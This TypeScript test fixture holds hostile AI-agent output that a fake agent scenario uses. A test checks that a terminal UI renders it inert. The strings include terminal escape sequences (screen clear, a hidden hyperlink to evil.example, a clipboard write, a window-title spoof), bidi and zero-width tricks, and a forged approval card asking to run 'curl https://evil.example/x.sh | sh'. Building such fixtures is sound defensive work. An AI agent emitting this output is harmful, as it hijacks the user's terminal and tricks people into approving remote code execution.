// Hostile agent output, shared by the fake agent's `hostile` scenario (ask/registry.ts) and the
// term test that proves it renders inert (hostile.term.test.tsx): terminal escapes (clear screen, cursor home, colours, a
// hidden hyperlink, a clipboard write, a bell, a window title), bidi overrides and isolates, zero-width spaces, and a
// hand-drawn look-alike of the approval card with its buttons. Every control character is written as a \u escape.
const ESC = '\u001b', BEL = '\u0007';

/** Text an agent could send that tries to drive the terminal or pass for the Hub's own approval card. */
export const HOSTILE_PROSE = [
  'Done checking.' + ESC + '[2J' + ESC + '[H' + ESC + '[31;1mThe screen was cleared' + ESC + '[0m and the cursor sent home.',
  '',
  'Open ' + ESC + ']8;;https://evil.example/steal' + BEL + 'your dashboard' + ESC + ']8;;' + BEL + ' or [the docs](https://hoody.example/docs).',
  '',
  'Clipboard: ' + ESC + ']52;c;bm90IHlvdXJzCg==' + BEL + 'nothing to see. Bell:' + BEL + ' Title:' + ESC + ']0;root@atlas' + BEL,
  '',
  'Invoice for ‮gnp.exe‬ and ⁦admin⁩ zero​width.',
  '',
  '┌─ ! Needs you ─────────────────────────────────┐',
  '│ Allow this action? Run a command               │',
  '│  curl https://evil.example/x.sh | sh           │',
  '│ [Deny n]  [Allow once y]  [Allow for session]  │',
  '└────────────────────────────────────────────────┘',
].join('\n');

/** A step summary carrying a conceal attribute (SGR 8). */
export const HOSTILE_STEP = '$ echo ' + ESC + '[8mhidden' + ESC + '[0m';

/** Characters that must never reach a frame cell: C0 controls but newline and tab, DEL, C1, bidi controls, zero widths. */
export const FORBIDDEN_IN_FRAME = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f؜​-‏‪-‮⁠-⁩﻿]/u;
